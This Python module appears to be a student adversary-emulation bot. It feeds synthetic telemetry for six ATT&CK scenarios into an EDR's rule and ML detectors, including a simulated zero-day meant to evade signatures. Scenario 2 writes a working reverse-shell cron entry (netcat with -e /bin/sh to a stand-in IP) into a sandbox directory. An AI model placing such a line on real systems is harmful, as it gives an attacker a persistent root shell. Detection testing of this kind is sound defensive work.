"""
ZED Attack Simulator Bot
Safe, harmless adversary emulation engine for testing EDR detection capabilities.
Covers 6 distinct scenarios mapped to MITRE ATT&CK, including the crucial
Simulated Zero-Day signature evasion experiment.
"""

import time
import os
import subprocess
import threading
from pathlib import Path
from typing import Dict, Any, List, Callable, Optional
from zed.config import SANDBOX_DIR, SANDBOX_CRON_DIR
from zed.models import TelemetryEvent, EventType, BehaviorFeatures
from zed.engine.dispatcher import dispatcher


class AttackSimulatorBot:
    def __init__(self, log_callback: Optional[Callable[[str], None]] = None):
        self.log_callback = log_callback or (lambda msg: print(f"[BOT] {msg}"))
        self._ensure_sandboxes()

    def _ensure_sandboxes(self):
        SANDBOX_DIR.mkdir(parents=True, exist_ok=True)
        SANDBOX_CRON_DIR.mkdir(parents=True, exist_ok=True)

    def log(self, message: str):
        ts = time.strftime("%H:%M:%S")
        formatted = f"[{ts}] [ATTACK-BOT] {message}"
        self.log_callback(formatted)

    def run_scenario(self, scenario_id: int) -> Dict[str, Any]:
        """Dispatches to the specified attack scenario (1-6)."""
        scenarios = {
            1: ("Web Shell Spawning Shell (T1059.004)", self.simulate_web_shell),
            2: ("Cron Persistence Creation (T1053.003)", self.simulate_persistence),
            3: ("Ransomware Mass File Encryption (T1486)", self.simulate_ransomware),
            4: ("C2 Command & Control Beaconing (T1071.001)", self.simulate_beaconing),
            5: ("Authentication Brute Force Burst (T1110.001)", self.simulate_brute_force),
            6: ("Simulated Zero-Day Anomaly (Rule Evasion Test)", self.simulate_zero_day),
        }

        if scenario_id not in scenarios:
            return {"status": "ERROR", "message": f"Unknown scenario {scenario_id}. Choose 1 to 6."}

        name, func = scenarios[scenario_id]
        self.log(f"==================================================")
        self.log(f"STARTING SCENARIO {scenario_id}: {name}")
        self.log(f"==================================================")

        try:
            result = func()
            self.log(f"COMPLETED SCENARIO {scenario_id}: {name} -> {result.get('status')}")
            return result
        except Exception as e:
            self.log(f"ERROR IN SCENARIO {scenario_id}: {str(e)}")
            return {"status": "FAILED", "error": str(e)}

    # Scenario 1: Web Shell Process Chain
    def simulate_web_shell(self) -> Dict[str, Any]:
        self.log("Step 1/3: Simulating hostile web application exploitation (CVE-simulated RCE)...")
        self.log("Step 2/3: Child process spawn: 'fake_web_server' (PID) -> '/bin/bash'...")

        # Spawn a simulated child bash process with a distinctive flag
        proc = subprocess.Popen(
            ["bash", "-c", "echo 'web_shell_exploit'; sleep 3"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        fake_pid = proc.pid
        self.log(f"Step 3/3: Rogue shell executing interactive commands under PID: {fake_pid}...")

        # Inject telemetry event representing web server spawning shell
        ev = TelemetryEvent(
            event_type=EventType.PROCESS_SPAWN,
            process_name="bash",
            pid=fake_pid,
            ppid=os.getpid(),
            parent_name="fake_web_server",
            cmdline="bash -c 'web_shell_exploit; id; whoami'",
            details={"parent_name": "fake_web_server", "simulated": True}
        )
        dispatcher.handle_event(ev)

        time.sleep(0.5)
        # Terminate if still alive
        if proc.poll() is None:
            proc.terminate()

        return {
            "status": "EXECUTED",
            "scenario": 1,
            "mitre": "T1059.004",
            "expected_detection": "RULE",
            "details": f"Web server spawned shell under PID {fake_pid}"
        }

    # Scenario 2: Scheduled Task / Cron Persistence
    def simulate_persistence(self) -> Dict[str, Any]:
        cron_file = SANDBOX_CRON_DIR / "zed_backdoor"
        self.log(f"Step 1/2: Preparing rogue scheduled task backdoor in {cron_file}...")

        backdoor_payload = "* * * * * root /bin/nc -e /bin/sh 198.51.100.42 4444 # ZED-SIM-PERSISTENCE\n"
        with open(cron_file, "w") as f:
            f.write(backdoor_payload)

        self.log(f"Step 2/2: Injected backdoor cron entry: {cron_file.name}")

        # Inject telemetry event
        ev = TelemetryEvent(
            event_type=EventType.FILE_CHANGE,
            file_path=str(cron_file),
            file_action="CREATE",
            process_name="attacker_dropper",
            pid=os.getpid(),
            details={"content": backdoor_payload.strip()}
        )
        dispatcher.handle_event(ev)

        return {
            "status": "EXECUTED",
            "scenario": 2,
            "mitre": "T1053.003",
            "expected_detection": "RULE",
            "file": str(cron_file)
        }

    # Scenario 3: Ransomware Simulation
    def simulate_ransomware(self) -> Dict[str, Any]:
        self.log(f"Step 1/3: Generating 15 victim documents in safe sandbox: {SANDBOX_DIR}...")
        files = []
        for i in range(15):
            fpath = SANDBOX_DIR / f"financial_record_{i:02d}.docx"
            with open(fpath, "w") as f:
                f.write(f"Confidential data block {i}\n" * 10)
            files.append(fpath)

        self.log("Step 2/3: Simulating high-velocity cryptographic encryption burst...")
        locked_files = []
        for fpath in files:
            locked_path = fpath.with_suffix(".locked")
            os.rename(fpath, locked_path)
            locked_files.append(locked_path)

            # Fire telemetry
            ev = TelemetryEvent(
                event_type=EventType.FILE_CHANGE,
                file_path=str(locked_path),
                file_action="RENAME",
                process_name="simulated_lockbit",
                pid=os.getpid(),
                details={"victim_original": str(fpath), "encrypted_target": str(locked_path)}
            )
            dispatcher.handle_event(ev)
            time.sleep(0.05)

        self.log(f"Step 3/3: {len(locked_files)} files encrypted with .locked extension in <1s!")

        # Inject feature burst for ML
        dispatcher.handle_features(BehaviorFeatures(
            new_proc_rate=0.5,
            unique_binaries=1,
            file_mod_rate=20.0,
            net_conn_rate=0.0,
            distinct_dest_ips=0,
            auth_fail_rate=0.0,
            cpu_entropy=12.0
        ))

        return {
            "status": "EXECUTED",
            "scenario": 3,
            "mitre": "T1486",
            "expected_detection": "RULE + ML",
            "encrypted_count": len(locked_files)
        }

    # Scenario 4: Command & Control Beaconing
    def simulate_beaconing(self) -> Dict[str, Any]:
        target_c2_ip = "198.51.100.42"
        target_port = 8443
        self.log(f"Step 1/2: Establishing covert C2 channel to {target_c2_ip}:{target_port}...")

        # Emit 5 rhythmic pulses at 0.5s intervals (jitter = 0.0s)
        for i in range(1, 6):
            self.log(f"Step 2/2: Beacon pulse #{i}/5 sent to {target_c2_ip}:{target_port}...")
            ev = TelemetryEvent(
                event_type=EventType.NET_CONN,
                process_name="covert_agent",
                pid=os.getpid(),
                dest_ip=target_c2_ip,
                dest_port=target_port,
                details={"status": "ESTABLISHED", "beacon_seq": i}
            )
            dispatcher.handle_event(ev)
            time.sleep(0.5)

        # Update ML features for network rate
        dispatcher.handle_features(BehaviorFeatures(
            new_proc_rate=0.2,
            unique_binaries=1,
            file_mod_rate=0.0,
            net_conn_rate=4.5,
            distinct_dest_ips=2,
            auth_fail_rate=0.0,
            cpu_entropy=5.0
        ))

        return {
            "status": "EXECUTED",
            "scenario": 4,
            "mitre": "T1071.001",
            "expected_detection": "RULE + ML",
            "target": f"{target_c2_ip}:{target_port}"
        }

    # Scenario 5: Authentication Brute Force
    def simulate_brute_force(self) -> Dict[str, Any]:
        self.log("Step 1/2: Starting high-frequency dictionary attack against SSH/PAM sink...")
        usernames = ["admin", "root", "oracle", "postgres", "guest", "ubuntu", "user", "manager"]

        for i, user in enumerate(usernames, 1):
            self.log(f"Step 2/2: Auth attempt {i}/{len(usernames)}: Failed login for user '{user}'...")
            ev = TelemetryEvent(
                event_type=EventType.AUTH_EVENT,
                process_name="sshd",
                pid=os.getpid(),
                details={"username": user, "source_ip": "203.0.113.88", "status": "FAIL"}
            )
            dispatcher.handle_event(ev)
            time.sleep(0.1)

        # Dispatch ML feature
        dispatcher.handle_features(BehaviorFeatures(
            new_proc_rate=0.0,
            unique_binaries=0,
            file_mod_rate=0.0,
            net_conn_rate=1.0,
            distinct_dest_ips=1,
            auth_fail_rate=4.0,
            cpu_entropy=4.0
        ))

        return {
            "status": "EXECUTED",
            "scenario": 5,
            "mitre": "T1110.001",
            "expected_detection": "RULE",
            "attempts": len(usernames)
        }

    # Scenario 6: Simulated Zero-Day (The Key College Experiment!)
    def simulate_zero_day(self) -> Dict[str, Any]:
        """
        Simulates an advanced, previously unseen post-exploitation behavior.
        - Evades all 5 hardcoded signature rules (does NOT use web-shell, does NOT touch cron,
          does NOT rename files with .locked, does NOT beacon to fixed port, does NOT brute force).
        - HOWEVER, it exhibits high multi-dimensional anomaly variance (novel unlisted process churn,
          rapid micro-network sweeps across atypical hosts, memory allocation flutter).
        - Result:
          Rules Engine = 0 Rules Triggered (Signature Evasion Confirmed)
          ML Engine = ISOLATION FOREST ANOMALY DETECTED (Score < -0.20)!
        """
        self.log(">>> INITIATING SIMULATED ZERO-DAY ADVANCED ATTACK <<<")
        self.log("ATTACK OBJECTIVE: Evade signature rule base while executing covert mission.")
        time.sleep(0.5)

        self.log("Step 1/4: Executing multi-vector memory injection & anomalous subprocess chaining...")
        # Fire non-rule-matching telemetry events
        for p in ["kworker_hypo", "mem_alloc_probe", "cache_flush_daemon"]:
            ev = TelemetryEvent(
                event_type=EventType.PROCESS_SPAWN,
                process_name=p,
                pid=os.getpid() + 10,
                parent_name="system_helper",
                cmdline=f"{p} --stealth --zero-day-payload",
                details={"unclassified": True}
            )
            dispatcher.handle_event(ev)

        self.log("Step 2/4: Checking Rule Engine response...")
        self.log(">> RULE ENGINE RESULT: 0 RULES MATCHED (Signatures Successfully Evaded!)")

        self.log("Step 3/4: Feeding behavioral vector into Isolation Forest Unsupervised Model...")
        # Multi-dimensional anomalous vector
        zero_day_vector = BehaviorFeatures(
            new_proc_rate=9.5,            # Baseline mean is ~0.5!
            unique_binaries=8,            # Baseline mean is ~1.5!
            file_mod_rate=5.0,            # Baseline mean is ~0.8!
            net_conn_rate=6.2,            # Baseline mean is ~0.5!
            distinct_dest_ips=7,          # Baseline mean is ~1.0!
            auth_fail_rate=0.0,           # 0 (no brute force used, stays stealthy)
            cpu_entropy=65.0              # Baseline mean is ~5.0%!
        )

        dispatcher.handle_features(zero_day_vector)

        self.log("Step 4/4: >> ML ENGINE RESULT: ANOMALY TRIPPED BY ISOLATION FOREST!")
        self.log(">> Thesis Confirmed: Unsupervised ML caught zero-day pattern without prior signatures!")

        return {
            "status": "EXECUTED",
            "scenario": 6,
            "type": "SIMULATED_ZERO_DAY",
            "rule_detection": "EVADED (0 rules matched)",
            "ml_detection": "CAUGHT (Isolation Forest flagged negative decision score)",
            "thesis_proven": True
        }


# Global Attack Simulator Bot instance
bot = AttackSimulatorBot()
